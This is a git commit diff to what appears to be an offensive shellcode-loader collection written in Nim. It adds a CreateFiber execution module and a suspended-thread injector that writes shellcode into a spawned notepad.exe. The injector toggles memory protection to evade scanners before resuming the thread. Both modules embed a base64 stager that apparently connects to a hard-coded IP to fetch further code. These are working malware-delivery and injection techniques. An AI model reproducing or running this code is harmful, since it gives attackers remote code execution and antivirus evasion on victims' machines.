9d866c8410aac4dccf8d4fb401787809c33f0f34
ar33zy <ar33zyboi@gmail.com>
2022-08-26 13:46:19 +0800

    Added 3 new techniques SuspendedThread CreateFiber CreateThreadpoolWait

--- modules/create_fiber.nim
+++ modules/create_fiber.nim
@@ -3,14 +3,14 @@ import base64
 import winim
 import winim/lean
 
-proc createThreadpoolWait[byte](shellcode: openArray[byte]): void =
-  let event = CreateEvent(NULL, FALSE, TRUE, NULL);
+proc createFiber[byte](shellcode: openArray[byte]): void =
+  let main_fiber = ConvertThreadToFiber(NULL);
+  
   let rPtr = VirtualAlloc(nil, cast[SIZE_T](shellcode.len), MEM_COMMIT, PAGE_EXECUTE_READ_WRITE)
   copyMem(rPtr, unsafeAddr shellcode, cast[SIZE_T](shellcode.len))
 
-  let threadPoolWait = CreateThreadpoolWait(cast[PTP_WAIT_CALLBACK](rPtr), NULL, NULL);
-  SetThreadpoolWait(threadPoolWait, event, NULL);
-  WaitForSingleObject(event, 0xFFFF);
+  let fiber = CreateFiber(0, cast[LPFIBER_START_ROUTINE](rPtr), NULL)
+  SwitchToFiber(fiber)
 
     
 when isMainModule:
@@ -20,4 +20,4 @@ when isMainModule:
   let enc = "/EiD5PDoyAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwJ1couAiAAAAEiFwHRnSAHQUItIGESLQCBJAdDjVkj/yUGLNIhIAdZNMclIMcCsQcHJDUEBwTjgdfFMA0wkCEU50XXYWESLQCRJAdBmQYsMSESLQBxJAdBBiwSISAHQQVhBWF5ZWkFYQVlBWkiD7CBBUv/gWEFZWkiLEulP////XWoASb53aW5pbmV0AEFWSYnmTInxQbpMdyYH/9VIMclIMdJNMcBNMclBUEFQQbo6Vnmn/9XpkwAAAFpIicFBuLsBAABNMclBUUFRagNBUUG6V4mfxv/V63lbSInBSDHSSYnYTTHJUmgAMsCEUlJBuutVLjv/1UiJxkiDw1BqCl9IifG6HwAAAGoAaIAzAABJieBBuQQAAABBunVGnob/1UiJ8UiJ2knHwP////9NMclSUkG6LQYYe//VhcAPhZ0BAABI/88PhIwBAADrs+nkAQAA6IL///8vdlBMSwA1TyFQJUBBUFs0XFBaWDU0KFBeKTdDQyk3fSRFSUNBUi1TVEFOREFSRC1BTlRJVklSVVMtVEVTVC1GSUxFISRIK0gqADVPIVAlAFVzZXItQWdlbnQ6IE1vemlsbGEvNC4wIChjb21wYXRpYmxlOyBNU0lFIDcuMDsgV2luZG93cyBOVCA1LjE7IC5ORVQgQ0xSIDIuMC41MDcyNzsgLk5FVCBDTFIgMy4wLjA0NTA2LjMwKQ0KADVPIVAlQEFQWzRcUFpYNTQoUF4pN0NDKTd9JEVJQ0FSLVNUQU5EQVJELUFOVElWSVJVUy1URVNULUZJTEUhJEgrSCoANU8hUCVAQVBbNFxQWlg1NChQXik3Q0MpN30kRUlDQVItU1RBTkRBUkQtQU5USVZJUlVTLVRFU1QtRklMRSEkSCtIKgA1TyFQJUBBUFs0XFBaWDU0KFBeKTdDQyk3fSRFSUNBUi1TVEFOREFSRC1BTlRJVklSVVMtVEVTVC1GSQBBvvC1olb/1UgxyboAAEAAQbgAEAAAQblAAAAAQbpYpFPl/9VIk1NTSInnSInxSInaQbgAIAAASYn5QboSloni/9VIg8QghcB0tmaLB0gBw4XAdddYWFhIBQAAAABQw+h//f//MTkyLjE2OC4yNTQuMTQ1AAAAAAA=" 
 
   let shellcode = toByteSeq(decode(enc))
-  createThreadpoolWait(shellcode)
+  createFiber(shellcode)
--- modules/suspended_thread.nim
+++ modules/suspended_thread.nim
@@ -1,18 +1,64 @@
 import base64
+import osproc
+import os
 
 import winim
 import winim/lean
 
-proc createThreadpoolWait[byte](shellcode: openArray[byte]): void =
-  let event = CreateEvent(NULL, FALSE, TRUE, NULL);
-  let rPtr = VirtualAlloc(nil, cast[SIZE_T](shellcode.len), MEM_COMMIT, PAGE_EXECUTE_READ_WRITE)
-  copyMem(rPtr, unsafeAddr shellcode, cast[SIZE_T](shellcode.len))
+proc suspendedThread[byte](shellcode: openArray[byte]): void =
+  var op: DWORD
+  let tProcess = startProcess("notepad.exe")
+  tProcess.suspend() # That's handy!
+  defer: tProcess.close()
 
-  let threadPoolWait = CreateThreadpoolWait(cast[PTP_WAIT_CALLBACK](rPtr), NULL, NULL);
-  SetThreadpoolWait(threadPoolWait, event, NULL);
-  WaitForSingleObject(event, 0xFFFF);
+  echo "[*] Target Process: ", tProcess.processID
 
-    
+  let pHandle = OpenProcess(
+    PROCESS_ALL_ACCESS, 
+    false, 
+    cast[DWORD](tProcess.processID)
+  )
+  defer: CloseHandle(pHandle)
+
+  echo "[*] pHandle: ", pHandle
+
+  let rPtr = VirtualAllocEx(
+    pHandle,
+    NULL,
+    cast[SIZE_T](shellcode.len),
+    MEM_COMMIT,
+    PAGE_EXECUTE_READ_WRITE
+  )
+
+  var bytesWritten: SIZE_T
+  let wSuccess = WriteProcessMemory(
+    pHandle, 
+    rPtr,
+    unsafeAddr shellcode,
+    cast[SIZE_T](shellcode.len),
+    addr bytesWritten
+  )
+
+  echo "[*] WriteProcessMemory: ", bool(wSuccess)
+  echo "    \\-- bytes written: ", bytesWritten
+  echo ""
+  VirtualProtect(cast[LPVOID](rPtr), shellcode.len, PAGE_NOACCESS,addr op)
+  let tHandle = CreateRemoteThread(
+    pHandle, 
+    NULL,
+    0,
+    cast[LPTHREAD_START_ROUTINE](rPtr),
+    NULL, 
+    0x00000004, 
+    NULL
+  )
+
+  sleep(10000)
+  VirtualProtect(cast[LPVOID](rPtr), shellcode.len, PAGE_EXECUTE_READ_WRITE,addr op)
+  ResumeThread(tHandle)
+  echo "[*] tHandle: ", tHandle
+  echo "[+] Injected" 
+  
 when isMainModule:
   func toByteSeq*(str: string): seq[byte] {.inline.} =
     @(str.toOpenArrayByte(0, str.high))
@@ -20,4 +66,4 @@ when isMainModule:
   let enc = "/EiD5PDoyAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwJ1couAiAAAAEiFwHRnSAHQUItIGESLQCBJAdDjVkj/yUGLNIhIAdZNMclIMcCsQcHJDUEBwTjgdfFMA0wkCEU50XXYWESLQCRJAdBmQYsMSESLQBxJAdBBiwSISAHQQVhBWF5ZWkFYQVlBWkiD7CBBUv/gWEFZWkiLEulP////XWoASb53aW5pbmV0AEFWSYnmTInxQbpMdyYH/9VIMclIMdJNMcBNMclBUEFQQbo6Vnmn/9XpkwAAAFpIicFBuLsBAABNMclBUUFRagNBUUG6V4mfxv/V63lbSInBSDHSSYnYTTHJUmgAMsCEUlJBuutVLjv/1UiJxkiDw1BqCl9IifG6HwAAAGoAaIAzAABJieBBuQQAAABBunVGnob/1UiJ8UiJ2knHwP////9NMclSUkG6LQYYe//VhcAPhZ0BAABI/88PhIwBAADrs+nkAQAA6IL///8vdlBMSwA1TyFQJUBBUFs0XFBaWDU0KFBeKTdDQyk3fSRFSUNBUi1TVEFOREFSRC1BTlRJVklSVVMtVEVTVC1GSUxFISRIK0gqADVPIVAlAFVzZXItQWdlbnQ6IE1vemlsbGEvNC4wIChjb21wYXRpYmxlOyBNU0lFIDcuMDsgV2luZG93cyBOVCA1LjE7IC5ORVQgQ0xSIDIuMC41MDcyNzsgLk5FVCBDTFIgMy4wLjA0NTA2LjMwKQ0KADVPIVAlQEFQWzRcUFpYNTQoUF4pN0NDKTd9JEVJQ0FSLVNUQU5EQVJELUFOVElWSVJVUy1URVNULUZJTEUhJEgrSCoANU8hUCVAQVBbNFxQWlg1NChQXik3Q0MpN30kRUlDQVItU1RBTkRBUkQtQU5USVZJUlVTLVRFU1QtRklMRSEkSCtIKgA1TyFQJUBBUFs0XFBaWDU0KFBeKTdDQyk3fSRFSUNBUi1TVEFOREFSRC1BTlRJVklSVVMtVEVTVC1GSQBBvvC1olb/1UgxyboAAEAAQbgAEAAAQblAAAAAQbpYpFPl/9VIk1NTSInnSInxSInaQbgAIAAASYn5QboSloni/9VIg8QghcB0tmaLB0gBw4XAdddYWFhIBQAAAABQw+h//f//MTkyLjE2OC4yNTQuMTQ1AAAAAAA=" 
 
   let shellcode = toByteSeq(decode(enc))
-  createThreadpoolWait(shellcode)
+  suspendedThread(shellcode)
